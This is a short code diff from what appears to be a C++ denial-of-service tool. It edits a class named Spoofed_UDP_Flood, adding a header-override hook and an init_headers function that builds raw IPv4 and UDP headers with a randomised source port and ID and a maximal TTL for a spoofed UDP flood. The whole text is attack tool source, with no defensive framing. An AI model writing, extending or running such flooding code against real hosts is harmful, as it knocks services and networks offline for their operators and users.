@@ -41,6 +41,7 @@ void Spoofed_UDP_Flood::attack(const int *id) {
             }
 
             init_headers(ip, udp, buf);
+            override_headers(udp, ip);
 
             dst.sin_addr.s_addr = ip->daddr;
             dst.sin_family = AF_UNSPEC;
@@ -80,4 +81,29 @@ void Spoofed_UDP_Flood::attack(const int *id) {
 
 Spoofed_UDP_Flood::Spoofed_UDP_Flood(const config *conf, Logger *logger) : Spoofed_Flood(conf, logger) {
 
+}
+
+void Spoofed_UDP_Flood::override_headers(udphdr *udp, iphdr *ip) {
+
+}
+
+void Spoofed_UDP_Flood::init_headers(iphdr *ip, udphdr *udp, char *buf) {
+    auto s_port = Randomizer::randomPort();
+    // IP Struct
+    ip->ihl = 5;
+    ip->version = 4;
+    ip->tos = 16;
+    ip->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + strlen(buf);
+    ip->id = static_cast<u_short>(Randomizer::randomInt(1, 1000));
+    ip->frag_off = htons(0x0);
+    ip->ttl = 255;
+    ip->protocol = IPPROTO_UDP;
+    ip->check = 0;
+    ip->check = csum((unsigned short *) buf, ip->tot_len);
+
+    // UDP Struct
+    udp->source = htons(static_cast<uint16_t>(s_port));
+    udp->dest = htons(static_cast<uint16_t>(strtol(conf->port.c_str(), nullptr, 10)));
+    udp->len = htons(static_cast<uint16_t>(sizeof(struct udphdr)));
+    udp->check = 0;
 }
